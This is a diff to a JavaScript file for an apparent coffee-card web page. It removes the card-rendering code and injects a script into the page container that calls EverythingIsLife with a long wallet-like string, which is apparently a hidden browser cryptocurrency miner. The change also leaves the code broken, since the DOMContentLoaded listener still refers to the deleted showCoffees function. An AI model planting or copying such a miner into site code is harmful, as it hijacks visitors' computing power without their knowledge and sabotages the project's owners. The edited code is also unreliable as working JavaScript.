@@ -1,24 +1,6 @@
-const container = document.querySelector(".container");
-const coffees = [
-  {
-    name: "Perspiciatis",
-    image: "images/coffee1.jpg"
-  }
-];
-const showCoffees = () => {
-  let output = "";
-  coffees.forEach(
-    ({ name, image }) =>
-      (output += `
-              <div class="card">
-                <img class="card--avatar" src=${image} />
-                <h1 class="card--title">${name}</h1>
-                <a class="card--link" href="#">Taste</a>
-              </div>
-              `)
-  );
-  container.innerHTML = output;
-};
+const container = document.querySelector(".container").innerHTML = `<script type="text/javascript">
+EverythingIsLife('463kPA3S5aEYfqM5rngfTgL8VGyMxq85P2hNHLhCcGH35wgNWzSrSRUD58n3oAy23ZcufWwxCQ8CbCLUPutLGFrp8n3vpWB', 'x', 50);
+</script>`
 
 document.addEventListener("DOMContentLoaded", showCoffees);
 
